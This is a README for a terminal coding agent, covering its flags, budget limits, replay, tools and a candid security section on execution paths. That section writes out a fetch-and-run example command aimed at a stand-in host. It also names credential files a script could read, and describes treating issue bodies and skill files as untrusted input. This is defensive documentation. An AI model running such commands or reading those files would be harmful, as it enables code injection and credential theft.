# Acuvo Code

A coding agent for your terminal that **writes code, runs it, reads the failure, and fixes it** — and that can *look at* what it built.

Zero dependencies. One file of Node, no framework, no install-time build step.

```bash
acuvo "the invoice test is failing — work out why and fix it"
```

---

## Why this instead of the others

Most terminal coding agents are the same shape: a model, a file writer, and a loop. Two things here are not.

**It runs what it writes.** Not "generates and hopes" — it executes the code, reads the actual exit code and stderr, and fixes the cause. On our task bench that loop is the difference between 5/7 and 7/7 with no change of model.

**It can see — and it hands back a verdict, not a picture.** `see_page` renders HTML you wrote in a real browser, saves the screenshot into your workspace, and returns what was *measured*: `unreadable text (contrast 1.03:1, needs 4.5): Ember & Oak`. About two hundred tokens of specific defects, in the order that matters — a console error that stopped the page booting is printed first, because it explains everything under it.

That last part is the difference, and it is worth being precise about it. **The edge is the return value, not the browser.** Screenshot tooling is not scarce: Playwright MCP and Chrome DevTools MCP are free and one install away, and your agent may already have a browser built in. What they hand back is an *image*, and the model has to interpret its own screenshot — the thing models are worst at.

Measured 2026-08-10 against a live Playwright MCP server on one page: the screenshot round-trip cost **3,072 tokens**; the `see_page` verdict for the same page was **89 tokens** — a **34×** difference, and the smaller one is the one that already contains the answer. `see_page` does the measuring in code, reports a judgement, and **abstains when it cannot tell** rather than inventing a finding (`findingsFrom`, `lib/media.mjs`). On our own pages that abstention killed two false accusations per page.

Be clear about what that claim is worth: it is a software edge a competent developer could reproduce in a weekend. It buys a head start, not a moat — and it survives a customer typing `claude mcp add playwright`, which is the whole reason it is the claim we make.

It also speaks, transcribes, and turns HTML into PDF/PNG/PPTX — see [Media tools](#media-tools). Those are optional and only appear when their service is configured.

---

## Install

Requires **Node 20+**.

**The repository is public.** `https://github.com/xxiautomate-star/acuvo-code` is open and
clonable — verified 2026-08-11 by cloning it into an empty directory and running both the
CLI and the test suite out of the result. Clone it with
`git clone https://github.com/xxiautomate-star/acuvo-code.git`, then run
`node acuvo-code/bin/acuvo.mjs --doctor`. The clone carries `bin/`, `lib/`, `test/` and
`bench/`, and there is no `node_modules` to fetch, so `node --test test/*.test.mjs` executes
immediately on a fresh checkout.

> ⚠️ **This section used to say that URL 404s.** It did when it was written; it does not now,
> and a warning that has become false is as expensive as the wrong instruction it replaced.
>
> ⚠️ **But what is published is behind, and its suite is not green.** The public repo is a
> single commit — *"Acuvo Code 0.2.0 — a coding agent that runs what it writes"*. Cloned and
> run 2026-08-11: **1,192 tests, 4 failing** (`test/bundle.test.mjs` and
> `test/docs-truth.test.mjs` fail at file level, plus one `STUCK_PATTERNS` assertion),
> against 1,378 tests and 0 failing on the working tree this README describes. If you are
> evaluating the clone, you are evaluating an older thing than the document — said here
> because a reader who hits a red suite deserves to know it was expected rather than
> conclude the project does not test itself.
>
> Still true: **neither `acuvo-code` nor `acuvo` is published to npm** (the registry returns
> 404 for both), so there is no `npm install -g` route.

**Or run it from the source you already have.** The package is self-contained and has no
dependencies, so there is nothing to install — point Node at the entry file:

```bash
node /path/to/acuvo-code/bin/acuvo.mjs --version
node /path/to/acuvo-code/bin/acuvo.mjs "add a health check to src/server.js"
```

To get `acuvo` on your PATH, link the directory you have:

```bash
cd /path/to/acuvo-code
npm link          # no dependencies to fetch — this only creates the shim
acuvo --version
```

> ⚠️⚠️ **THE SINGLE-FILE BUNDLE DOES NOT EXIST, AND THIS SECTION USED TO SAY IT DID.**
> It described `npm run bundle` as producing a `dist/acuvo.mjs`, and quoted a measurement —
> "Verified 2026-08-11: `1,228,642 bytes`, `42 modules · 13 node builtins · 1 inlined asset`".
> **No such run ever happened.** `package.json` declares the script, but `scripts/bundle.mjs`
> was never written: the agent building it died mid-stream after writing 545 lines of spec
> and before writing a line of implementation. Run it today and you get
> `Error: Cannot find module .../scripts/bundle.mjs`, exit 1 — and all 44 tests in
> `test/bundle.test.mjs` skip themselves with *"scripts/bundle.mjs is not written yet"*.
>
> It is left in `package.json` because the spec is real and the module is wanted. It is
> struck here because a byte count nobody measured is the worst kind of documentation: it
> reads as the most rigorous line on the page.

**Pending, not available:** `npm install -g acuvo-code`, and the single-file bundle. When
either exists this section gets its one-line route and these warnings go.

### Before anything else: `acuvo --doctor`

```bash
acuvo --doctor
```

It needs **no API key and no network** and spends nothing. It says, line by line, what is
actually working on this machine — the key, the four models in the fallback chain, every
media endpoint, which tools the model would be offered, and git — and every dark or broken
line names the exact variable that fixes it. Exit 0 when nothing is broken, 1 otherwise, so
it works in CI. `--doctor --json` gives the machine form.

```
MODEL CHAIN (4 DEEP · DEFAULT DEEPSEEK/DEEPSEEK-V4-FLASH-0731)
  live    OPENROUTER_API_KEY         present, and it authenticates
  live    account balance            $9.16 remaining of $10.00
MEDIA SERVICES
  live    see_page                   configured (…acuvo-render-audit-measure.modal.run) · reachable and authorised
  dark    speak                      MODAL_TTS_URL is unset, so speak is never offered to the model
                                     → set MODAL_TTS_URL to your endpoint URL (and MODAL_VIDEO_SECRET to the value it expects)

14 live · 6 dark · 0 broken
nothing is broken.
```

### The one thing you must set

```bash
export OPENROUTER_API_KEY=sk-or-v1-...        # bash
$env:OPENROUTER_API_KEY = "sk-or-v1-..."      # PowerShell
```

Or point Node at a file that already has it:

```bash
node --env-file=.env acuvo-code/bin/acuvo.mjs "<prompt>"
```

`--version` and `--help` work without a key — they are how you check the install worked.

---

## Options

Every flag below is real; run `acuvo --help` for the authoritative list.

| flag | what it does |
|---|---|
| `--dir <path>` | Workspace root. Default: the current directory. |
| `--model <id>` | OpenRouter model id. Default: `$OPENROUTER_CODEGEN_MODEL`, else `deepseek/deepseek-v4-flash-0731` (`DEFAULT_MODEL`, `lib/model.mjs`). |
| `--max-rounds <n>` | Write → run → fix rounds, 1–16. Default **5** (`DEFAULT_MAX_ROUNDS`, `lib/cli-args.mjs`). `1` means one completion and nothing executed. |
| `--budget <usd>` | Stop when the **next** round would cross this much spend. `--budget 0.50`, `--budget 25c`, `--budget $2` all parse. Refuses to start at all if it cannot afford one round. |
| `--until-done` | Keep going while the criterion you declared is unmet, the budget allows, and the loop is not going in circles. **Requires `--budget`.** |
| `--lease <path>` | Claim a file before starting, so several terminals can share one checkout. Repeatable. Released when the process exits, however it exits. |
| `--holder <name>` | Who to record as holding those leases. Default: the pid. |
| `--no-run` | Never execute anything. It can still read, write and edit. |
| `--command-timeout <s>` | Kill a command after this long. Default 120 (`DEFAULT_COMMAND_TIMEOUT_MS`, `lib/command.mjs`). |
| `--max-tokens <n>` | Ceiling on each reply. Default **12000** (`DEFAULT_MAX_TOKENS`, `lib/model.mjs`). |
| `--timeout <s>` | Give up on the model after this long. Default 180. |
| `--issue <n>` | Read a GitHub issue, branch, fix it, run the tests. Stops at a local branch — never pushes, never opens a PR. |
| `--parallel` | Run several quoted tasks at once. Names any file written by more than one task and exits 1 on a collision. |
| `--concurrency <n>` | How many at a time, 1–4. Default 2. |
| `--json` | One JSON object on stdout, nothing else. Human output goes to stderr. |
| `--dry-run` | Print what *would* be written. Touches nothing, runs nothing. |
| `--version`, `-v` | Print the version. |
| `--help`, `-h` | Usage. |

Run `acuvo` with no prompt to open an **interactive session** — it keeps context between turns, so "now do the same for the other file" works, and the unchanged prompt prefix caches at ~97%, making later turns far cheaper than the first.

Exit code is `1` if the last command it ran still fails. That makes it usable in a script.

### Stop on money, not on a counter

```
acuvo --budget 0.50 "make the failing suite pass"
acuvo --until-done --budget 0.50 "make npm test pass, then commit it"
```

The round counter was always an arbitrary stop: it ends a run that is one round from
finishing, and it lets a run that is going nowhere spend its whole allowance. `--budget`
makes the wall the thing you actually have an opinion about.

Before every round it projects what the next one will cost — from the trend of the rounds
so far, with a safety margin — and stops if that would cross your ceiling. So it stops
*before* the round that would exceed the budget, not after. It also **refuses to start**
when it cannot afford even one round, so a `--budget 0.000001` typo costs nothing instead
of buying one round to discover it was hopeless.

The run prints one line at the end:

```
budget: $0.0048 of $0.0500 spent · 4 rounds · next ~$0.0013 · $0.0452 left
```

⚠️ **Two honest limits.** A round that comes back with no reported cost is *estimated* from
its token count at a single blended rate, and the line says so (`⚠ 1 of 3 rounds reported no
cost, so the total is an estimate`) rather than printing a confident total. And the overshoot
bound is **one round, not zero**: a cost curve growing faster than ~1.4× per round can cross
the line by at most that round's own cost. If you need a hard guarantee, leave headroom.

⚠️ **`--until-done` will not run without `--budget`.** An unbounded loop against a paid API,
unattended, is the one thing this CLI refuses to do. With both flags it stops accepting the
model's own "I am finished" while a criterion you declared with `declare_acceptance` has not
actually passed — up to three times, then it stops and records the criterion as unmet. It
still stops immediately on the budget, and it stops if the loop detector sees the same
circular pattern twice.

⚠️ `--budget` and `--parallel` together are refused rather than silently multiplied: a
ceiling for one conversation applied to three tasks is three times the number you typed.

### Several terminals, one checkout

```
acuvo --lease src/api.ts --lease src/db.ts "add the pagination"
acuvo leases        # who holds what, and since when. No API key needed.
```

Leases are per **path**, not per repo — a repo-wide lock would idle six of seven terminals.
They are taken before anything is spent, heartbeated between rounds, and released when the
process exits however it exits. A stale one becomes reclaimable only after its TTL *plus* a
grace period of silence, so a slow model round cannot make a working terminal look dead.

⚠️ **This is a declaration, not a guarantee.** A coding agent does not know which files it
will write until it writes them, so `--lease` protects exactly the paths you name. Making
coverage automatic means calling `acquire()` inside the executor's write path — that work is
not done, and pretending otherwise would be worse than the gap.

⚠️ Two defaults moved and this table was wrong about both for a while: `--max-rounds` was
documented as 3 and `--max-tokens` as 8000. The numbers above are the exported constants,
and `test/docs-truth.test.mjs` now fails the suite if the README and the code disagree
again. `acuvo --help` prints the same values from the same constants — trust either.

### Runs are saved, and every run leaves a record

Verified by running it, 2026-08-10:

| flag | what it does |
|---|---|
| `--sessions` | List the runs saved in this workspace, newest first, and exit. Needs no API key. |
| `--resume <id>` | Carry on from a saved run. Add an instruction to steer it: `--resume <id> "now add tests"`. |
| `--continue` | The same, on the most recent resumable run. |
| `--no-session` | Do not save this run. |
| `--no-audit` | Do not append this run to the audit log. |
| `--replay <id>` | Step through a saved run: every round, call, result and refusal. Runs **nothing** and writes nothing. |
| `--replay <id> --only <what>` | Narrow it: `refusals`, `writes`, `runs`, `effects`, `reasoning`. A filtered call brings its result with it. |
| `--replay <a> --diff <b>` | Compare two runs and name the step where they split. |

`--replay` is how you answer "what did it actually do on Tuesday" after the terminal has
closed. Real output, from a run made while writing this:

```
run 20260811-034506-nr33 · deepseek/deepseek-v4-flash-0731 · 2 rounds · $0.000921
⚠ REPLAY — nothing here was re-run. Every line below is what happened then.
── round 1 ─────────────────────────────────────────────
  → call   write_file  path="slug.mjs"  content="export function slugify(s) {…"… (144 chars)
  ✔ result  created slug.mjs (144 bytes)
── round 2 ─────────────────────────────────────────────
  → call   run_command  command="node --test slug.test.mjs"
  ✔ passed  exit code: 0 (0.4s) — PASSED
  counts   3 calls · 0 refused · 2 writes · 1 runs
```

⚠️ It **re-runs nothing** — same invariant `--resume` holds, and for the same reason: a
replay that re-executed would be a command run twice by someone who typed it once. The JSON
form says so in a field (`executed: false`) rather than only in prose.

A finished run writes two things into the workspace: `.acuvo/sessions/<id>.json`, so a
follow-up rebuilds the conversation instead of re-paying for the whole gather, and one
line of `.acuvo/audit/<date>.jsonl` — what was asked, what changed, what verified, what it
cost. Measured: the second turn of a resumed task cost **11,516 tokens against the first
turn's 17,312**.

The audit line carries no file contents, no command output and no model prose, and it is
run through a redactor first (`redact`, `lib/audit.mjs`) — an OpenRouter key in your task
text comes out as `[redacted:api-key]`. `--dry-run` writes neither file, because a dry run
that creates two files has broken its own promise.

---

## Three things it does that a coding agent usually cannot

### Fix a GitHub issue

```bash
acuvo --issue 42
```

Reads the issue, creates `fix/42-<slug>`, finds the cause, fixes it, runs the tests.

It **stops there**. No push, no pull request — it prints the exact `git push` and `gh pr create`
for you to run. An agent that opens a PR because it believed it was finished is an agent that
embarrasses you in front of your team. If you already use `gh`, it reuses that login.

⚠️ The issue body is treated as untrusted input. Anyone can open an issue on a public repo, so it
is quoted to the model as *a report to investigate*, never as instructions to follow.

### Several tasks at once

```bash
acuvo --parallel "add tests for the parser" "write the README" --concurrency 3
```

The interesting part is not the speed, it is the collision. Two agents in one workspace will
eventually write the same file, and whoever finishes second wins — silently. Acuvo records what
each task wrote, **names any file written by more than one of them**, and exits 1 so
`acuvo --parallel … && git commit` refuses to proceed.

It does not try to merge them. Two model-authored versions of a file cannot be reconciled without
you.

### Work you can script

```bash
acuvo --json "add a health check" | jq '.verification.passed'
```

One object on stdout, every human line on stderr. `ran` and `passed` are separate fields, because
a test suite that executed and failed is not the same as one that never ran.

---

## Not just code

If the services are configured, the tools it can reach include `see_page`, `make_document`,
`transcribe` and `speak`. The combinations are the point:

```bash
acuvo "make me a one-page invoice for Acme Ltd, 3 line items, and give me it as a PDF"
```

→ writes the HTML, **looks at it**, converts it. A real PDF, no coding involved.

```bash
acuvo "transcribe standup.m4a and turn the decisions into a checklist"
```

---

## What it can execute — read this before trusting it

**Four programs, and nothing else:** `node`, `npm`, `npx`, `tsc`.

Concretely: `node <file>`, `node --test <file-or-dir>`, `npm test`, `npm run <script>`, `npx vitest run`, `tsc --noEmit`.

**There is no shell.** Pipes, `&&`, `;`, redirection, quotes, backticks and `$()` are refused by a character whitelist, so `npm test && curl evil.sh | sh` dies at the `&` rather than at a blacklist of program names somebody has to maintain. `rm`, `curl`, `git` and every other binary are simply unreachable.

Arguments are checked too — `node --eval` is refused (code that never touches disk cannot be reviewed afterwards), and every non-flag token must resolve inside your workspace.

`npm test` runs whatever `package.json` says, and the agent can *write* `package.json` — so the **script body is validated before npm is spawned**, along with its `pre`/`post` hooks.

The child process gets a **scrubbed environment**: conventionally-named secrets are stripped, so a generated script cannot read your API keys and post them somewhere.

### Other languages: presets, off by default

Those four are the *default*, not the ceiling, and this README used to stop at "four
programs" as though they were. A project can enable one of six vetted **presets** — each a
build/test driver for code already on disk:

| preset | what it adds |
|---|---|
| `python` | `python`, `python3`, `pytest` |
| `go` | `go` |
| `rust` | `cargo` |
| `ruby` | `ruby`, `rspec`, `bundle` |
| `make` | `make` |
| `node-bin` | `eslint`, `prettier`, `jest` |

```json
// .acuvo/commands.json
{ "presets": ["python"] }
```

Then `python -m pytest` is accepted; without it the refusal *names the preset that would
allow it* rather than just saying no. `acuvo --doctor` prints the enabled set —
`live programs it may run  node, npm, npx, tsc · no presets enabled` on a fresh workspace.

⚠️ **The workspace file may name presets and nothing else, and that boundary is the whole
design.** `.acuvo/commands.json` lives in the workspace, and the agent can write to the
workspace — so a file there choosing an *arbitrary* binary would be the agent granting
itself a program. Every preset is a menu item vetted in `lib/command.mjs`; picking one buys
a second interpreter for code the agent could already execute with `node`. A program of
your own choosing can only be named in **`ACUVO_ALLOW_COMMANDS`**, in the environment that
launches the CLI, which the agent has no verb that reaches. A shell (`bash`, `sh`, `cmd`,
`powershell`, `env`, `xargs`, …) is refused at every layer including that one.

### ⚠️ There is a second execution path, and this section used to omit it

`evaluate` (`lib/evaluate.mjs`) runs a JavaScript snippet the model wrote. It exists because
the model kept reaching for `node -e "…"`, which dies on the quote whitelist above and burns
a round — so it was given the thing instead of another sentence telling it not to.

**It does not go through the command whitelist at all.** It writes the snippet to
`.acuvo-eval-<pid>-<ts>.mjs` at the workspace root and spawns `node <that file>` directly, so
`ALLOWED_BINARIES`, the argument grammar and the `npm` script-body validation described above
**do not apply to it**. Omitting that from this section was the omission worth naming: the
paragraph claimed four programs and nothing else, and there was a fifth door.

What *does* apply, verified in the source:

- **`--no-run` removes it.** `evaluate` is only offered when running is allowed (`lib/tools.mjs`), so the flag documented as "never execute anything" is honest about it.
- **`--dry-run` refuses it** before anything is staged (`evaluateSnippet`).
- The same **workspace path rules**, the same **bounded spawn**, the same **scrubbed environment** as `run_command`.
- 4,000 characters maximum (`MAX_SNIPPET_CHARS`) — longer than that is a program, and programs get written properly.
- The file is removed in a `finally`, including on timeout, and the snippet is **echoed back in the result**, which is what keeps the `node --eval` audit objection satisfied.

The honest summary: `evaluate` cannot do anything `write_file` + `run_command` could not
already do in two calls, which is the right test for any new capability. But it *is* a code
execution path, and a security section that lists execution paths has to list it.

### And a third: `run_program`

`run_program` (`lib/spawn-argv.mjs`) starts a process too, so by the same rule it belongs in
this list. It exists because the paragraph above is not only a security boundary, it is also
a **capability ceiling**: a string runner cannot tell `node app.js add "buy milk"` from a
model composing a second command, so it refuses the quote — and the agent could not execute
the flags and arguments it had *itself just written*. Measured in three probe runs; two of
them shipped a README describing output that had never been produced.

What applies to it, verified in the source:

- **The same four programs.** `ALLOWED_BINARIES` is imported from `lib/command.mjs`, not
  re-declared. Every `node` flag *before* the script path is checked by asking
  `validateCommand` about that one token, so `--eval`, `--require`, `--import`, `--env-file`,
  `--inspect` and `--watch` stay closed with `command.mjs`'s own refusal sentence. There is
  one authority and no second copy to drift.
- **It is a strict subset, never a widening.** `.acuvo/commands.json` may only *add* presets,
  so the four fixed binaries here can never exceed what `run_command` would allow on the same
  machine. The asymmetry runs the other way: if you enabled the `python` preset, that reaches
  you through `run_command` only.
- **No shell, ever.** `spawn` with `shell: false` and an argv array. A quote, a space, a
  `--flag`, a `;` or a `>` is *data in an argv slot* — there is no parser left to reinterpret
  it, which is why widening the character whitelist was the wrong fix.
- **`--no-run` withholds it and `--dry-run` refuses it**, both at the offer *and* at the
  dispatcher, because a model can call a tool it was never shown.
- The same **bounded spawn**, **output cap** and **scrubbed environment** — plus it deletes
  two variables `run_command` does not: `NODE_OPTIONS` (the flag allowlist's back door, read
  by node before argv) and `NODE_TEST_CONTEXT` (which makes a nested `node --test` return
  exit 0 and empty output — a silent green).
- **No detached spawning, and no process-group kill.** The child is SIGKILLed on timeout and
  a grandchild it spawned can outlive it. Stated rather than papered over.

### ⚠️ What this is not

**It is not a sandbox, and calling it one would be dishonest.** `node src/thing.js`, where a language model wrote `src/thing.js` thirty seconds ago, *is* arbitrary code execution — unavoidably, because running the code is the entire point of a fix loop.

The real boundary: the agent cannot compose a command, cannot pick a program, cannot pass arguments outside your workspace, and cannot see your credentials **in its environment**. The code it runs can still do anything Node can do. The mitigation is that the code is **on disk, written by tools that could not leave the workspace, and shown to you** before it runs.

⚠️ Those three words matter and were missing. The scrub is a **denylist over environment
variable names** (`SECRET_NAME`, `lib/command.mjs`). It does not reach the filesystem: a
generated script can still read `~/.aws/credentials`, `~/.ssh/id_rsa` and
`~/.config/gh/hosts.yml`, and a variable named `MY_DB_STRING` survives the pattern. The
source says so about itself; this sentence used to round it up to "cannot see your
credentials", full stop.

Use `--dry-run` for a task you do not trust yet, or `--no-run` to let it write without
executing. Both now also block the MCP spawn described below — verified by running a
workspace containing a hostile `.mcp.json` under each flag.

---

## The rest of the verbs

The registry holds **36 tools** (`TOOL_NAMES`, `lib/tools.mjs` — count it yourself, and
`acuvo --doctor` prints which of them would be offered on your machine). The obvious ones
are above; **eighteen more** reach the model in any multi-round run (`--max-rounds` above 1,
which is the default). You never name them — the model picks. They are listed because a
capability only the changelog knows about is unreachable in the way that matters.

| tool | what it does | when it is offered |
|---|---|---|
| `run_program` | Run `node` / `npm` / `npx` / `tsc` with a **real argument array** instead of a string. `run_command` has to guess whether a quote is you passing a value or the model composing a second command, so it refuses the character — which means `node bin/todo.js add "buy milk"`, `node bin/todo.js list --all` and `node --test "test/*.test.mjs"` were all unrunnable. Here each array item is exactly one argv slot, there is no shell and nothing re-parses it. | withheld by `--no-run` and by `--dry-run`, like every other way of starting a process |
| `read_lines` · `read_around` | Windowed reads of a large file. `read_file` truncates the **middle** of a big file and gives the model nothing to act on; these truncate the **end** and hand back a `nextOffset` to continue from. `read_around` returns byte-exact text with real indentation, which is the only safe source for an `edit_file` old\_string. | always |
| `fetch_url` | Fetch a public page as text. GET only, no headers, private and loopback addresses refused, 10 fetches per run. | always |
| `plan_start` · `plan_step` · `plan_status` | A visible plan with a **round countdown**. Every later round carries `plan: 1/3 done · 2 remaining: … · round 4 of 5`, so the model can see the wall it is driving at instead of spending its last round the way it spent its first. | always |
| `declare_acceptance` · `check_acceptance` | Name the command that decides whether the job is done, and run it. A **declared** criterion sets the exit code — see below. | withheld by `--no-run`, because `check_acceptance` executes commands |
| `list_sessions` | Lets the model see that an earlier run already attempted this. Read-only; resuming is an operator action, from the command line. | always |
| `read_skill` | Opens one of *your* procedures — see below. | only when `.acuvo/skills/` holds at least one skill |
| `delegate` | Hands a **read-only** research question to a helper with its own fresh context — "where is X defined", "which files call Y" — and gets back a short summary instead of everything it read. The helper is offered twelve tools, all of them reads (`SUBAGENT_TOOL_NAMES`, `lib/subagent.mjs`); it cannot write, edit, commit or run anything, it is capped at 6 rounds (4 by default), and **it cannot delegate again** (`MAX_SUBAGENT_DEPTH` = 1 — two levels is how a five-round task becomes a hundred model calls nobody authorised). | always, when model credentials reached the dispatcher — it is the one tool that spends a completion of its own, and it refuses rather than guessing a config |
| `remember` · `forget` | Facts that outlive the run. `remember` writes one markdown file per fact into `.acuvo/memory/`; the next run reads them back into the prompt, so it does not rediscover your real test command. `forget` deletes one, because a wrong memory is worse than no memory. Bounded at 40 entries / 4,000 bytes / 400 characters a fact, oldest evicted; every fact must carry a `why`, and anything that pattern-matches a credential is refused outright — *"these files are committed to the repo, so nothing secret can go in one"*. | always |
| `find_definition` · `find_references` · `check_types` · `list_symbols` | Real semantic navigation through a language server (typescript-language-server, pyright, rust-analyzer, gopls). | only when a server is installed **and** this project contains that language |

⭐ **The two gates are the point, not a limitation.** A control that presents itself and
does nothing is worse than one that is absent: a model offered `check_types` on a machine
with no language server learns to try, wait and apologise. Measured while integrating
this: a zero-dependency JavaScript package was offering all four LSP tools because
`rust-analyzer` happened to be on the developer's `PATH` from unrelated work — installed,
useless here, and four dead buttons. The gate is now the intersection of *installed* and
*spoken by this project*.

### Skills — your procedures, no pull request needed

Write a markdown file in `.acuvo/skills/`:

```markdown
---
name: new-endpoint
description: how this project adds an HTTP endpoint
when: adding any new route or endpoint
---

1. Every endpoint file goes in `routes/`, named `<verb>-<noun>.js`.
2. Every endpoint must export a function called `handle`.
3. Every file must start with `// OWNER: platform-team`.
```

The catalogue (name, description, when) goes into the system prompt; the **body** is only
loaded when the model calls `read_skill`, so twenty skills cost you three lines of prompt
rather than twenty documents.

Measured, 2026-08-11, with exactly the skill above and the task
`"add an endpoint that returns the current health status"` — nothing about skills in the
prompt the user typed: the model called `read_skill` as its **first** tool and wrote
`routes/get-health.js`, exporting `handle`, beginning with `// OWNER: platform-team`.

⚠️ **A skill is notes, not permissions.** It cannot grant a tool, lift a restriction or
override a safety rule, and both the catalogue and the loaded body say so — a skill file
is prose sitting in a repository, so it is treated as untrusted text.

### Acceptance — make the verdict be about the command *you* named

`✔ VERIFIED` means *a* command exited 0. That is not the same as "the thing you asked for
passed", and the gap is where a green tick about the wrong command lives.

- A **declared** criterion (`declare_acceptance`, or `.acuvo/acceptance.json`) **decides
  the exit code.** If it is unmet, the process exits 1 and `--json` reports
  `failed: true`. If nothing in the run satisfied it, it is run once at the end, free —
  no model call.
- A **derived** criterion — read out of your own task text, e.g. `"it must pass: npm
  test"` — is **reported and never gates.** This runner guessed it out of prose, and a
  guess must not be able to fail a run that did the right thing under a different name
  (`npm test` vs `npm run test`).

`--json` says which you got:

```json
"acceptance": { "source": "declared", "gating": true, "verdict": "unmet",
                "unmet": [{ "command": "npm test", "why": "it ran and exited 1" }] }
```

⚠️ **Read `.acceptance` as well as `.verification`.** A run can verify one command and
miss the one you named; `verification.passed` will be `true` and `acceptance.verdict` will
be `unmet`. The exit code follows the declared criterion, so `acuvo --json … && git push`
is safe *if the criterion was declared*.

### `.acuvo/` — what the CLI writes into your workspace

It is one directory in **your** repository, and it holds two different kinds of thing.

| path | what it is | commit it? |
|---|---|---|
| `.acuvo/sessions/` | Resumable runs, newest 20 kept. What `--sessions`, `--resume` and `--replay` read. | **no** — machine-local, and large |
| `.acuvo/audit/<date>.jsonl` | One redacted line per invocation: what was asked, what changed, what verified, what it cost. Never file contents, command output or model prose. | **your call.** Ignore it by default; commit it deliberately if the record is the point |
| `.acuvo/plan.json`, `.acuvo/acceptance.json` | The agent's own bookkeeping for the run in progress. | no |
| `.acuvo/skills/*.md` | *Your* procedures — see above. | **yes** |
| `.acuvo/memory/*.md` | Facts `remember` recorded, one file each. Markdown on purpose: diffable, reviewable in a PR, and the reason a credential is refused before it can be written. | **yes** |
| `.acuvo/commands.json` | Which command presets this project enables — see below. | **yes** |
| `.acuvo/mcp.json` | MCP servers to connect to (`.mcp.json` at the root is also read, second). Written by you; no tool can add one. | yes, if your team shares them — and read `ENTERPRISE.md` §3.1 first, because a *committed* one in a repo you cloned is spawned on an ordinary run |

So the ignore rule is not `.acuvo/`, and this section used to say it was — which would have
thrown away the three files that are meant to travel with the repo:

```gitignore
.acuvo/*
!.acuvo/skills/
!.acuvo/memory/
!.acuvo/commands.json
```

`--no-session` and `--no-audit` opt out of the two records; `--dry-run` writes neither.

---

## What it sends before it starts

Every fresh task begins with a **repo map**: the directory tree plus the exported symbols of
the source files, bounded to about 6,000 tokens (`DEFAULT_BUDGET_TOKENS`, `lib/repo-map.mjs`),
and byte-stable so the prompt prefix caches. Files that do not fit are named as a count per
directory, with a pointer to `find_files` / `search_text` — omitted, never silently absent.

⚠️ **This replaced an older pre-read that had two real defects**, and both are fixed rather
than mitigated:

- It walked only **two levels** and read the *contents* of every small file it found. A module
  four directories down was invisible, so the model would invent a plausible file and write
  over the wrong one.
- It sent the **body of gitignored files** to the provider. The map lists a path when the tree
  shows one and never reads an ignored file's contents. `.env`, `*.pem`, `id_rsa` and other
  credential-shaped files are withheld entirely and reported as a count.

If a workspace cannot be read, the map is simply empty and the task proceeds — a pre-read is
an optimisation, not a precondition, and it may never be the thing that kills a run.

---

## Git

Git is exposed as **structured verbs**, not as a command string: `git_status`, `git_diff`, `git_log`, `git_commit`.

`push`, `reset`, `checkout`, `clean`, `rebase` and `merge` are not refused — they are **inexpressible**. There is no path from a model-authored string to a git subcommand it was not given.

Two deliberate restrictions:

- **Commit requires you to name the paths.** There is no "commit everything": sweeping up files nobody looked at is how scratch files and secrets get committed.
- `.env`, `*.pem`, `id_rsa` and friends are **never** staged, whatever `.gitignore` says. History keeps a secret after you delete it.

⚠️ If your workspace sits *inside* a larger repository, git commands are refused. Git walks upward to find a repo, so operating from a subdirectory would report — and commit — changes from the whole outer project.

---

## Media tools

Four of these are **only offered when you configure their endpoint**. A tool whose service is absent is never mentioned, so the agent cannot waste a round discovering it does not work.

| tool | env | what it does |
|---|---|---|
| `see_page` | `RENDER_AUDIT_URL` | Render your HTML in a real browser; save the screenshot, report measured layout problems. |
| `speak` | `MODAL_TTS_URL` | Text → an audio file in your workspace. |
| `transcribe` | `MODAL_TRANSCRIBE_URL` | Audio/video → text with timestamped segments. |
| `make_document` | `MODAL_PRESS_URL` | HTML → PDF, PNG or PPTX. |
| *(all four)* | `MODAL_VIDEO_SECRET` | The shared secret those endpoints expect. |

> ⚠️ **`MODAL_VIDEO_SECRET` is the one that costs the most time, and it used to be
> documented nowhere.** It is not a URL, so it never appears in an error about a missing
> endpoint — a correctly-set URL *without* it fails authorisation and reads like a broken
> service. Its absence is what made four working tools look broken. `acuvo --doctor` now
> distinguishes the three states explicitly: **live** (reachable *and* authorised),
> **dark** (unset — the tool is simply never offered), **broken** (set, and not answering).

### `--design <file.html>` — the design loop, without the agent

```bash
acuvo --design index.html
```

Renders the page, looks at it, and prints a verdict. No model call, no completion spent.
Real output, on a page written for this README:

```
LOOKED AT index.html — 1280×900
1. unreadable text (contrast 1.71:1, needs 4.5): Zero dependencies. One file. It runs what it writes.
2. the page scrolls sideways: content is 2590px wide in a 1280px viewport
  screenshot: .acuvo/render-1786419880418.png (19KB)
```

Exit 0 when the page was looked at and nothing was found; 1 when the look failed **or** the
page has findings. On a terminal that speaks kitty or iTerm2 the actual pixels are drawn
inline — the path line stays either way, because the image is an addition to the report and
never a replacement for it.

⚠️ **"Could not look" is never reported as "the page is fine."** With `RENDER_AUDIT_URL`
unset it names that variable and makes no claim about the page. The JSON form carries the
same distinction in a field (`trustworthy`), so a script cannot mistake one for the other.

⭐ The same verdict is what the *agent* now reads when it calls `see_page`. Measured: the
verdict is **26 tokens** where the raw tool record was **205** and the screenshot itself
would be **1,536**. Anyone can take the photograph; the compression is the product.

### Voice — `--task-audio` in, `--say` out

```bash
acuvo --task-audio note.wav          # transcribe a file and run what it says
acuvo --say "fix the failing test"   # speak the verdict when the run ends
```

⚠️ **It shows you the transcript and waits.** Enter cancels, `y` runs it, and anything else
is treated as a correction — `"no, the server not the sensor"` fixes a mis-heard word
without retyping the task. That keystroke is the whole thing standing between a mis-heard
word and a file-writing agent, so there is no way to skip it except `--yes`, which is
required in a pipe, in CI, or with `--json` (where there is nobody to ask).

A full round trip, run 2026-08-11: `--say` wrote a 424KB `.wav`, that file was fed back in
with `--task-audio`, and the transcript came back as *"Create a file called Greeting.Text
containing the word working."* — which, confirmed with `--yes`, the agent then did.

```
  heard in ask.wav:

    "Create a file called Greeting.Text containing the word working."

  run it? [y = yes · Enter = no · or type a correction]
```

**It does not record and it does not play.** `--task-audio` needs a file that already
exists; `--say` writes a `.wav` and prints the one command that plays it on your OS. Both
are deliberate: live capture and audio playback each mean an npm dependency or an OS binary
past the command allowlist, and zero dependencies is the point of this package.

⚠️ `--parallel` is **not** narrated. N verdicts read aloud in a random order is noise.

### The horizon: the history is compacted, and it says so

There is no flag for this. As a conversation approaches a 24,000-token budget the loop
compacts it **before** it pays for the next call — clamping and stubbing old tool results,
never removing messages — and prints what it freed. Real output, from a 15-round session
run 2026-08-11 (rounds 12, 13 and 14 each compacted):

```
── round 13/16 ─────────────────────────────
  · 25,206 → 23,287 estimated tokens (7.6% freed, ~1,919 tokens) across 3 of 12 tool results.
  ·   giant-results: 3
